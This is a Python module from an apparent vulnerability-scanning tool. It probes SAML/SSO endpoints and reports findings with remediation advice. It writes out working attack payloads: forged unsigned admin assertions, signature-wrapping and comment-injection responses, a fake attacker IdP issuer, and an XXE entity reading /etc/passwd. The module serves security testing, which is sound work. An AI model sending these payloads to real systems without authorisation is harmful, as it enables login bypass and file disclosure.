"""
SAML Security Scanner.
Tests for SAML/SSO Federation vulnerabilities.
"""

from __future__ import annotations

import base64
import xml.etree.ElementTree as ET
from datetime import datetime, timedelta
from typing import TYPE_CHECKING, Any
from urllib.parse import urljoin

import httpx

from scanning.findings import Finding, Severity, VulnType
from scanning.vuln_scanner import ScanModule
from utils.logger import get_logger
from utils.rate_limiter import RateLimiter
from utils.scan_client import get_scan_client
from scanning.scan_context import ScanContext

if TYPE_CHECKING:
    from core.config_manager import Settings

logger = get_logger(__name__)


class SAMLScanner(ScanModule):
    """
    SAML Security Scanner for SSO/Federation.
    
    Tests for:
    - XML Signature Wrapping (XSW)
    - SAML Response manipulation
    - Assertion replay attacks
    - Comment injection
    - Certificate issues
    - IdP confusion
    - Destination validation bypass
    - Audience restriction bypass
    - Time-based attacks (NotBefore/NotOnOrAfter)
    - Signature exclusion
    """
    
    name = "saml_scanner"
    
    # SAML endpoints
    SAML_ENDPOINTS = [
        "/saml/acs",
        "/saml/consume",
        "/saml/callback",
        "/saml/sso",
        "/saml/login",
        "/saml/auth",
        "/sso/saml",
        "/sso/callback",
        "/auth/saml/callback",
        "/api/saml/acs",
        "/api/auth/saml",
        "/simplesaml/module.php/saml/sp/saml2-acs.php",
        "/adfs/ls",
        "/adfs/ls/",
        "/_saml",
        "/saml2/acs",
        "/saml2",
    ]
    
    # SAML metadata endpoints
    METADATA_ENDPOINTS = [
        "/saml/metadata",
        "/saml/metadata.xml",
        "/saml/sp/metadata",
        "/sso/metadata",
        "/api/saml/metadata",
        "/simplesaml/module.php/saml/sp/metadata.php",
        "/FederationMetadata/2007-06/FederationMetadata.xml",
    ]
    
    # SAML IdP discovery
    IDP_DISCOVERY = [
        "/saml/discovery",
        "/saml/idp-discovery",
        "/discovery",
        "/sso/discovery",
    ]
    
    def __init__(
        self,
        settings: Settings,
        *,
        findings_store: Any = None,
        rate_limiter: Any = None,
    ) -> None:
        super().__init__(settings, findings_store=findings_store, rate_limiter=rate_limiter)
        self.timeout = settings.timeouts.request_timeout if hasattr(settings, 'timeouts') else 30.0
    
    async def scan(
        self,
        host: str,
        asset_data: dict[str, Any],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Scan for SAML security vulnerabilities."""

        # SCAN CONTEXT: Unified access to auth, response validation, training app awareness
        self._ctx = ScanContext(asset_data)
        self._auth_headers = self._ctx.auth_headers

        findings: list[Finding] = []

        base_url = f"https://{host}" if not host.startswith("http") else host

        # DIAG 2026-03-02: Log scan entry for debugging silent failures
        logger.warning(f"[SAML] SCAN START — host={host}, base_url={base_url}")

        async with get_scan_client(verify_ssl=False, timeout=self.timeout) as client:
            # Discover SAML endpoints
            saml_endpoints = await self._discover_saml_endpoints(
                client, base_url, rate_limiter
            )

            if not saml_endpoints:
                logger.warning(f"[SAML] SCAN END — no SAML endpoints found for {host} (0 findings)")
                return findings
            
            # Check SAML metadata exposure
            metadata_findings = await self._test_metadata_exposure(
                client, base_url, rate_limiter
            )
            findings.extend(metadata_findings)
            
            # Test XML Signature Wrapping
            xsw_findings = await self._test_signature_wrapping(
                client, base_url, saml_endpoints, rate_limiter
            )
            findings.extend(xsw_findings)
            
            # Test SAML Response manipulation
            response_findings = await self._test_response_manipulation(
                client, base_url, saml_endpoints, rate_limiter
            )
            findings.extend(response_findings)
            
            # Test signature exclusion
            sig_findings = await self._test_signature_exclusion(
                client, base_url, saml_endpoints, rate_limiter
            )
            findings.extend(sig_findings)
            
            # Test comment injection
            comment_findings = await self._test_comment_injection(
                client, base_url, saml_endpoints, rate_limiter
            )
            findings.extend(comment_findings)
            
            # Test assertion replay
            replay_findings = await self._test_assertion_replay(
                client, base_url, saml_endpoints, rate_limiter
            )
            findings.extend(replay_findings)
            
            # Test IdP confusion
            idp_findings = await self._test_idp_confusion(
                client, base_url, saml_endpoints, rate_limiter
            )
            findings.extend(idp_findings)
            
            # Test XXE in SAML
            xxe_findings = await self._test_saml_xxe(
                client, base_url, saml_endpoints, rate_limiter
            )
            findings.extend(xxe_findings)

        # DIAG 2026-03-02: Log scan exit with summary
        logger.warning(f"[SAML] SCAN END — {len(saml_endpoints)} endpoints discovered, "
                       f"{len(findings)} findings")

        return findings
    
    async def _discover_saml_endpoints(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> list[str]:
        """Discover SAML endpoints.

        FIX 2026-03-02: Two-phase discovery.
        Phase 1: GET — check for SAML content markers (metadata, IdP discovery).
        Phase 2: POST with dummy SAMLResponse — check for SAML-specific error
                 response (ACS endpoints only respond to POST, not GET).
        """
        endpoints = []

        saml_indicators = [
            "samlrequest", "samlresponse", "entityid",
            "assertionconsumerservice", "singlesignonservice",
            "x509certificate", "saml:assertion", "saml2:",
            "urn:oasis:names:tc:saml", "samlp:",
        ]
        # ACS-type paths that only accept POST
        acs_keywords = ("acs", "consume", "callback")

        all_endpoints = self.SAML_ENDPOINTS + self.METADATA_ENDPOINTS + self.IDP_DISCOVERY
        logger.warning(f"[SAML] Discovery: probing {len(all_endpoints)} candidate paths")

        for path in all_endpoints:
            await rate_limiter.acquire()

            try:
                url = urljoin(base_url, path)
                response = await client.get(url, follow_redirects=False)

                if response.status_code != 404:
                    content = response.text.lower()
                    has_saml_content = any(ind in content for ind in saml_indicators)
                    if has_saml_content:
                        endpoints.append(url)
                        logger.info(f"SAML endpoint found (content verified): {url}")
                        continue

                    # Phase 2: For ACS-type endpoints, try POST with dummy SAMLResponse.
                    # Real ACS endpoints return SAML-specific errors; non-SAML apps
                    # return generic HTML/JSON responses.
                    path_lower = path.lower()
                    if any(kw in path_lower for kw in acs_keywords):
                        await rate_limiter.acquire()
                        try:
                            post_resp = await client.post(
                                url,
                                data={"SAMLResponse": "dGVzdA=="},  # base64("test")
                            )
                            post_body = post_resp.text.lower()
                            # SAML-specific error = endpoint processes SAML
                            saml_error_indicators = [
                                "saml", "assertion", "signature",
                                "xml", "certificate", "issuer",
                                "invalid_response", "malformed",
                            ]
                            has_saml_error = any(
                                ind in post_body for ind in saml_error_indicators
                            )
                            # Reject: SPA shell or generic HTML
                            is_generic = (
                                "<!doctype" in post_body or "<html" in post_body
                            ) and not has_saml_error
                            if has_saml_error and not is_generic:
                                endpoints.append(url)
                                logger.info(f"SAML ACS endpoint found (POST verified): {url}")
                        except Exception:
                            pass

            except Exception as e:
                logger.debug(f"Error checking SAML endpoint {path}: {e}")

        logger.warning(f"[SAML] Discovery done: {len(endpoints)} confirmed SAML endpoints out of {len(all_endpoints)} probed")
        return endpoints
    
    async def _test_metadata_exposure(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Check SAML metadata exposure and configuration."""
        findings = []
        
        for path in self.METADATA_ENDPOINTS:
            await rate_limiter.acquire()
            
            try:
                url = urljoin(base_url, path)
                response = await client.get(url)
                
                if response.status_code == 200 and "xml" in response.headers.get("content-type", ""):
                    findings.append(Finding(
                        name="SAML Metadata Exposed",
                        severity=Severity.INFO,
                        confidence_score=85.0,
                        description="SAML SP metadata is publicly accessible",
                        endpoint=url,
                        evidence=["SAML metadata XML returned"],
                        cwe_id="CWE-200",
                        remediation="Review if metadata should be public. "
                                   "Ensure sensitive configuration is not exposed.",
                        vuln_type=VulnType.INFO_DISCLOSURE,
                        scanner="saml_scanner",
                    ))
                    
                    # Parse and check metadata
                    try:
                        root = ET.fromstring(response.text)
                        
                        # Check for certificate exposure
                        if "X509Certificate" in response.text:
                            findings.append(Finding(
                                name="SAML Certificate in Metadata",
                                severity=Severity.INFO,
                                confidence_score=85.0,
                                description="X509 certificate exposed in SAML metadata",
                                endpoint=url,
                                evidence=["Certificate found in metadata"],
                                cwe_id="CWE-200",
                                remediation="This is normal but verify certificate is not private key.",
                                vuln_type=VulnType.INFO_DISCLOSURE,
                                scanner="saml_scanner",
                            ))
                        
                        # Check for weak encryption
                        if "http://www.w3.org/2001/04/xmlenc#tripledes-cbc" in response.text:
                            findings.append(Finding(
                                name="Weak Encryption in SAML",
                                severity=Severity.MEDIUM,
                                confidence_score=85.0,
                                description="SAML metadata specifies weak encryption (3DES)",
                                endpoint=url,
                                evidence=["Triple-DES encryption algorithm found"],
                                cwe_id="CWE-327",
                                cvss_score=5.3,
                                remediation="Use AES-256 or stronger encryption.",
                                vuln_type=VulnType.SAML_VULNERABILITY,
                                scanner="saml_scanner",
                            ))
                            
                        # Check for SHA-1
                        if "http://www.w3.org/2000/09/xmldsig#sha1" in response.text:
                            findings.append(Finding(
                                name="Weak Hash Algorithm in SAML (SHA-1)",
                                severity=Severity.MEDIUM,
                                confidence_score=85.0,
                                description="SAML uses SHA-1 which is cryptographically weak",
                                endpoint=url,
                                evidence=["SHA-1 algorithm in SAML configuration"],
                                cwe_id="CWE-328",
                                cvss_score=5.3,
                                remediation="Upgrade to SHA-256 or SHA-512.",
                                vuln_type=VulnType.SAML_VULNERABILITY,
                                scanner="saml_scanner",
                            ))
                            
                    except ET.ParseError:
                        pass
                        
            except Exception as e:
                logger.debug(f"Error checking metadata: {e}")
        
        return findings
    
    async def _test_signature_wrapping(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        saml_endpoints: list[str],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test for XML Signature Wrapping (XSW) attacks."""
        findings = []
        
        # XSW attack payloads - different wrapping techniques
        # These are informational as full XSW requires valid signatures
        xsw_indicators = [
            "XML Signature Wrapping",
            "The response contains multiple assertions",
            "Signature verification",
        ]
        
        # Create a malformed SAML response with duplicate structures
        malformed_saml = '''<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" 
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_malformed" Version="2.0" IssueInstant="2026-01-01T00:00:00Z">
    <saml:Assertion ID="_original">
        <saml:Subject>
            <saml:NameID>victim@example.com</saml:NameID>
        </saml:Subject>
    </saml:Assertion>
    <saml:Assertion ID="_injected">
        <saml:Subject>
            <saml:NameID>attacker@evil.com</saml:NameID>
        </saml:Subject>
    </saml:Assertion>
</samlp:Response>'''
        
        encoded_saml = base64.b64encode(malformed_saml.encode()).decode()
        
        for endpoint in saml_endpoints:
            if "acs" in endpoint.lower() or "consume" in endpoint.lower():
                await rate_limiter.acquire()
                
                try:
                    # Test POST binding
                    response = await client.post(
                        endpoint,
                        data={"SAMLResponse": encoded_saml},
                        headers={"Content-Type": "application/x-www-form-urlencoded"}
                    )
                    
                    # Check response for XSW indicators
                    if response.status_code != 500:
                        # If server didn't reject outright
                        if "multiple" in response.text.lower() or \
                           "assertion" in response.text.lower():
                            findings.append(Finding(
                                name="Potential XSW Vulnerability - Manual Test Required",
                                severity=Severity.HIGH,
                                confidence_score=40.0,
                                description="Server processed SAML with multiple assertions. "
                                           "Manual testing required for XML Signature Wrapping.",
                                endpoint=endpoint,
                                evidence=[
                                    "Multiple assertion SAML was processed",
                                    "XSW attack surface detected",
                                ],
                                cwe_id="CWE-347",
                                cvss_score=8.1,
                                remediation="Implement strict signature validation. "
                                           "Ensure only signed assertions are trusted. "
                                           "Use XPath to validate exact assertion location.",
                                vuln_type=VulnType.SAML_VULNERABILITY,
                                scanner="saml_scanner",
                            ))
                            
                except Exception as e:
                    logger.debug(f"Error testing XSW: {e}")
        
        return findings
    
    async def _test_response_manipulation(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        saml_endpoints: list[str],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test SAML response manipulation."""
        findings = []
        
        # Test various SAML manipulation scenarios
        manipulations = [
            # Destination manipulation
            {
                "name": "Destination Bypass",
                "saml": '''<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                            Destination="https://evil.com/acs" ID="_test" Version="2.0">
                            </samlp:Response>''',
            },
            # InResponseTo manipulation
            {
                "name": "InResponseTo Bypass",
                "saml": '''<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                            InResponseTo="_fake_request_id" ID="_test" Version="2.0">
                            </samlp:Response>''',
            },
            # Missing IssueInstant
            {
                "name": "Missing Timestamp",
                "saml": '''<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                            ID="_test" Version="2.0">
                            </samlp:Response>''',
            },
        ]
        
        for endpoint in saml_endpoints:
            if "acs" in endpoint.lower() or "consume" in endpoint.lower():
                for manipulation in manipulations:
                    await rate_limiter.acquire()
                    
                    try:
                        encoded = base64.b64encode(manipulation["saml"].encode()).decode()
                        
                        response = await client.post(
                            endpoint,
                            data={"SAMLResponse": encoded},
                        )
                        
                        # Check if manipulation was accepted
                        if response.status_code in [200, 302]:
                            findings.append(Finding(
                                name=f"SAML {manipulation['name']} Possible",
                                severity=Severity.HIGH,
                                confidence_score=65.0,
                                description=f"SAML endpoint may not properly validate {manipulation['name']}",
                                endpoint=endpoint,
                                evidence=[
                                    f"Manipulation type: {manipulation['name']}",
                                    f"Response status: {response.status_code}",
                                ],
                                cwe_id="CWE-287",
                                cvss_score=8.1,
                                remediation="Implement strict SAML response validation.",
                                vuln_type=VulnType.SAML_VULNERABILITY,
                                scanner="saml_scanner",
                            ))
                            
                    except Exception as e:
                        logger.debug(f"Error testing manipulation: {e}")
        
        return findings
    
    async def _test_signature_exclusion(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        saml_endpoints: list[str],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test if unsigned SAML responses are accepted."""
        findings = []
        
        # Unsigned SAML assertion
        unsigned_saml = '''<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_unsigned_test" Version="2.0" IssueInstant="2026-01-01T00:00:00Z">
    <saml:Issuer>https://idp.example.com</saml:Issuer>
    <samlp:Status>
        <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
    </samlp:Status>
    <saml:Assertion ID="_unsigned_assertion" Version="2.0" IssueInstant="2026-01-01T00:00:00Z">
        <saml:Issuer>https://idp.example.com</saml:Issuer>
        <saml:Subject>
            <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">
                admin@example.com
            </saml:NameID>
        </saml:Subject>
        <saml:Conditions NotBefore="2026-01-01T00:00:00Z" NotOnOrAfter="2030-01-01T00:00:00Z">
            <saml:AudienceRestriction>
                <saml:Audience>https://sp.example.com</saml:Audience>
            </saml:AudienceRestriction>
        </saml:Conditions>
        <saml:AuthnStatement AuthnInstant="2026-01-01T00:00:00Z">
            <saml:AuthnContext>
                <saml:AuthnContextClassRef>
                    urn:oasis:names:tc:SAML:2.0:ac:classes:Password
                </saml:AuthnContextClassRef>
            </saml:AuthnContext>
        </saml:AuthnStatement>
    </saml:Assertion>
</samlp:Response>'''
        
        encoded = base64.b64encode(unsigned_saml.encode()).decode()
        
        for endpoint in saml_endpoints:
            if "acs" in endpoint.lower() or "consume" in endpoint.lower():
                await rate_limiter.acquire()
                
                try:
                    response = await client.post(
                        endpoint,
                        data={"SAMLResponse": encoded},
                    )
                    
                    # FIX 2026-03-01: Require strong evidence of authentication success.
                    # A 200/302 alone is NOT proof — SPAs return 200 for everything,
                    # and 302 redirects to / are normal error handling.
                    auth_indicators = [
                        "welcome", "dashboard", "logged in", "session_id",
                        "authenticated", "set-cookie",
                    ]

                    if response.status_code in [200, 302]:
                        response_text = response.text.lower()
                        resp_headers = str(response.headers).lower()

                        # Require ACTUAL auth evidence: session cookie set or auth content
                        has_session_cookie = any(
                            cookie_name in resp_headers
                            for cookie_name in ["set-cookie", "session", "jsessionid", "phpsessid"]
                        )
                        has_auth_content = any(ind in response_text for ind in auth_indicators)
                        # Reject: generic 200 (SPA shell) or redirect to root/home
                        is_spa_shell = (
                            response.status_code == 200
                            and ("<!doctype" in response_text or "<html" in response_text)
                            and not has_auth_content
                        )
                        is_generic_redirect = (
                            response.status_code == 302
                            and response.headers.get("location", "").rstrip("/") in ("", "/", "/#")
                        )

                        if (has_session_cookie or has_auth_content) and not is_spa_shell and not is_generic_redirect:
                            findings.append(Finding(
                                name="Unsigned SAML Response Accepted",
                                severity=Severity.CRITICAL,
                                confidence_score=85.0,
                                description="SAML endpoint accepts unsigned assertions. "
                                           "Full authentication bypass possible.",
                                endpoint=endpoint,
                                evidence=[
                                    "Unsigned SAML assertion accepted",
                                    f"Response: {response.status_code}",
                                    f"Auth evidence: session_cookie={has_session_cookie}, auth_content={has_auth_content}",
                                ],
                                cwe_id="CWE-347",
                                cvss_score=9.8,
                                remediation="ALWAYS require and validate XML signatures. "
                                           "Reject any unsigned SAML assertions.",
                                vuln_type=VulnType.SAML_VULNERABILITY,
                                scanner="saml_scanner",
                            ))
                            
                except Exception as e:
                    logger.debug(f"Error testing signature exclusion: {e}")
        
        return findings
    
    async def _test_comment_injection(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        saml_endpoints: list[str],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test for SAML comment injection (CVE-2017-11427 style)."""
        findings = []
        
        # Comment injection to bypass email validation
        # The signature is over "user@example.com" but parser sees "user@evil.com"
        comment_injection_saml = '''<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_comment_test" Version="2.0">
    <saml:Assertion>
        <saml:Subject>
            <saml:NameID>user@example.com<!---->.evil.com</saml:NameID>
        </saml:Subject>
    </saml:Assertion>
</samlp:Response>'''
        
        encoded = base64.b64encode(comment_injection_saml.encode()).decode()
        
        for endpoint in saml_endpoints:
            if "acs" in endpoint.lower() or "consume" in endpoint.lower():
                await rate_limiter.acquire()
                
                try:
                    response = await client.post(
                        endpoint,
                        data={"SAMLResponse": encoded},
                    )
                    
                    # FIX 2026-03-01: Require evidence of SAML processing,
                    # not just "not error". Non-SAML endpoints return 200/302 trivially.
                    if response.status_code in [200, 302]:
                        resp_text = response.text.lower()
                        resp_headers = str(response.headers).lower()
                        # Evidence: response shows SAML processing or sets auth cookies
                        saml_processed = (
                            "evil.com" in resp_text  # Comment injection actually parsed
                            or "set-cookie" in resp_headers
                            or any(s in resp_text for s in ["saml", "assertion", "authenticated"])
                        )
                        is_generic = "<!doctype" in resp_text or "<html" in resp_text
                        if saml_processed and not is_generic:
                            findings.append(Finding(
                                name="SAML Comment Injection Possible",
                                severity=Severity.HIGH,
                                confidence_score=40.0,
                                description="SAML endpoint may be vulnerable to comment injection "
                                           "(CVE-2017-11427 style attack)",
                                endpoint=endpoint,
                                evidence=[
                                    "Comment-injected SAML was processed",
                                    "Server accepted modified assertion without signature rejection",
                                    f"Response: {response.status_code}",
                                ],
                            cwe_id="CWE-91",
                            cvss_score=8.1,
                            remediation="Use XML canonicalization before signature verification. "
                                       "Update SAML libraries to latest versions.",
                            vuln_type=VulnType.SAML_VULNERABILITY,
                            scanner="saml_scanner",
                        ))
                        
                except Exception as e:
                    logger.debug(f"Error testing comment injection: {e}")
        
        return findings
    
    async def _test_assertion_replay(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        saml_endpoints: list[str],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test for SAML assertion replay attacks."""
        findings = []
        
        # Test with old timestamp - should be rejected
        old_timestamp = (datetime.utcnow() - timedelta(days=30)).strftime("%Y-%m-%dT%H:%M:%SZ")
        
        old_saml = f'''<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_old_test" Version="2.0" IssueInstant="{old_timestamp}">
    <saml:Assertion ID="_old_assertion" IssueInstant="{old_timestamp}">
        <saml:Conditions NotBefore="{old_timestamp}" NotOnOrAfter="{old_timestamp}">
        </saml:Conditions>
    </saml:Assertion>
</samlp:Response>'''
        
        encoded = base64.b64encode(old_saml.encode()).decode()
        
        for endpoint in saml_endpoints:
            if "acs" in endpoint.lower() or "consume" in endpoint.lower():
                await rate_limiter.acquire()
                
                try:
                    response = await client.post(
                        endpoint,
                        data={"SAMLResponse": encoded},
                    )
                    
                    # FIX 2026-03-01: Require evidence of SAML processing.
                    if response.status_code in [200, 302]:
                        resp_text = response.text.lower()
                        resp_headers = str(response.headers).lower()
                        # Must NOT contain rejection keywords AND show processing
                        is_rejected = any(w in resp_text for w in ["expired", "invalid", "error"])
                        shows_processing = (
                            "set-cookie" in resp_headers
                            or any(s in resp_text for s in ["saml", "assertion", "authenticated", "session"])
                        )
                        is_generic = "<!doctype" in resp_text or "<html" in resp_text
                        if not is_rejected and shows_processing and not is_generic:
                            findings.append(Finding(
                                name="SAML Assertion Replay Possible",
                                severity=Severity.HIGH,
                                confidence_score=65.0,
                                description="SAML endpoint may accept expired assertions. "
                                           "Replay attacks possible.",
                                endpoint=endpoint,
                                evidence=[
                                    f"30-day old assertion not rejected",
                                    f"Status: {response.status_code}",
                                ],
                                cwe_id="CWE-294",
                                cvss_score=7.4,
                                remediation="Implement strict NotOnOrAfter validation. "
                                           "Store and check assertion IDs for replay.",
                                vuln_type=VulnType.SAML_VULNERABILITY,
                                scanner="saml_scanner",
                            ))
                            
                except Exception as e:
                    logger.debug(f"Error testing replay: {e}")
        
        return findings
    
    async def _test_idp_confusion(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        saml_endpoints: list[str],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test for IdP confusion attacks."""
        findings = []
        
        # Try with unknown/malicious IdP issuer
        fake_idp_saml = '''<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_idp_test" Version="2.0">
    <saml:Issuer>https://evil-idp.attacker.com</saml:Issuer>
    <saml:Assertion>
        <saml:Issuer>https://evil-idp.attacker.com</saml:Issuer>
        <saml:Subject>
            <saml:NameID>admin@target.com</saml:NameID>
        </saml:Subject>
    </saml:Assertion>
</samlp:Response>'''
        
        encoded = base64.b64encode(fake_idp_saml.encode()).decode()
        
        for endpoint in saml_endpoints:
            if "acs" in endpoint.lower() or "consume" in endpoint.lower():
                await rate_limiter.acquire()
                
                try:
                    response = await client.post(
                        endpoint,
                        data={"SAMLResponse": encoded},
                    )
                    
                    # FIX 2026-03-01: Require SAML processing evidence.
                    if response.status_code in [200, 302]:
                        resp_text = response.text.lower()
                        resp_headers = str(response.headers).lower()
                        is_rejected = any(w in resp_text for w in [
                            "unknown", "invalid issuer", "error", "not configured"
                        ])
                        shows_processing = (
                            "set-cookie" in resp_headers
                            or any(s in resp_text for s in ["saml", "assertion", "authenticated"])
                        )
                        is_generic = "<!doctype" in resp_text or "<html" in resp_text
                        if not is_rejected and shows_processing and not is_generic:
                            findings.append(Finding(
                                name="SAML IdP Confusion Possible",
                                severity=Severity.HIGH,
                                confidence_score=40.0,
                                description="SP may not properly validate IdP issuer. "
                                           "IdP confusion attack possible.",
                                endpoint=endpoint,
                                evidence=[
                                    "Unknown IdP issuer not rejected",
                                    "Server accepted assertion from unknown IdP",
                                ],
                                cwe_id="CWE-287",
                                cvss_score=8.1,
                                remediation="Implement strict IdP issuer validation. "
                                           "Maintain allowlist of trusted IdPs.",
                                vuln_type=VulnType.SAML_VULNERABILITY,
                                scanner="saml_scanner",
                            ))
                            
                except Exception as e:
                    logger.debug(f"Error testing IdP confusion: {e}")
        
        return findings
    
    async def _test_saml_xxe(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        saml_endpoints: list[str],
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """Test for XXE in SAML processing."""
        findings = []
        
        # XXE payload in SAML
        xxe_saml = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_xxe_test" Version="2.0">
    <saml:Assertion>
        <saml:Subject>
            <saml:NameID>&xxe;</saml:NameID>
        </saml:Subject>
    </saml:Assertion>
</samlp:Response>'''
        
        encoded = base64.b64encode(xxe_saml.encode()).decode()
        
        for endpoint in saml_endpoints:
            if "acs" in endpoint.lower() or "consume" in endpoint.lower():
                await rate_limiter.acquire()
                
                try:
                    response = await client.post(
                        endpoint,
                        data={"SAMLResponse": encoded},
                    )
                    
                    # Check for XXE indicators
                    if "root:" in response.text or "/bin/bash" in response.text:
                        findings.append(Finding(
                            name="XXE in SAML Processing",
                            severity=Severity.CRITICAL,
                            confidence_score=85.0,
                            description="SAML processor is vulnerable to XML External Entity injection",
                            endpoint=endpoint,
                            evidence=[
                                "XXE payload executed",
                                "File contents in response",
                            ],
                            cwe_id="CWE-611",
                            cvss_score=9.1,
                            remediation="Disable external entity processing. "
                                       "Use secure XML parser configuration.",
                            vuln_type=VulnType.XXE,
                            scanner="saml_scanner",
                        ))
                    elif response.status_code in [200, 302]:
                        # FIX 2026-03-01: Require SAML processing evidence.
                        resp_text = response.text.lower()
                        resp_headers = str(response.headers).lower()
                        shows_processing = (
                            "set-cookie" in resp_headers
                            or any(s in resp_text for s in ["saml", "entity", "dtd", "xxe"])
                        )
                        is_generic = "<!doctype" in resp_text or "<html" in resp_text
                        if shows_processing and not is_generic:
                            findings.append(Finding(
                                name="SAML XXE - DTD Processing Enabled",
                                severity=Severity.HIGH,
                                confidence_score=65.0,
                                description="SAML processor may allow DTD/entity processing",
                                endpoint=endpoint,
                                evidence=[
                                    "XXE payload not rejected",
                                    f"Response: {response.status_code}",
                                ],
                            cwe_id="CWE-611",
                            cvss_score=7.5,
                            remediation="Disable DTD and external entity processing.",
                            vuln_type=VulnType.XXE,
                            scanner="saml_scanner",
                        ))
                        
                except Exception as e:
                    logger.debug(f"Error testing XXE: {e}")
        
        return findings
